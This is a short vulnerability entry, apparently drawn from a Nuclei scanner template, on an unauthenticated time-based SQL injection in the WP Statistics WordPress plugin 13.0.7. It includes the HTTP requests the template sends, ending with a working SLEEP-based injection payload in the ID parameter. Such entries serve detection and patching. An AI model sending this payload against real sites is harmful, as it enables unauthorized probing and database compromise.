# Vulnerability: WordPress WP Statistics Plugin 13.0.7 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`wp-statistics-sqli.yaml`)

## Description
WordPress Plugin WP Statistics 13.0.7  contains an unauthenticated Time based SQL injection vulnerability. The plugin does not sanitize and escape the id parameter before using it in a SQL statement, leading to an unauthenticated blind SQL injection. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/wp-statistics/readme.txt HTTP/1.1
Host: {{Hostname}}

@timeout: 20s
GET /wp-admin/admin.php?page=wps_pages_page&type=1&ID=1+AND+(SELECT+*+from+(select+SLEEP(7))a) HTTP/1.1
Host: {{Hostname}}
```

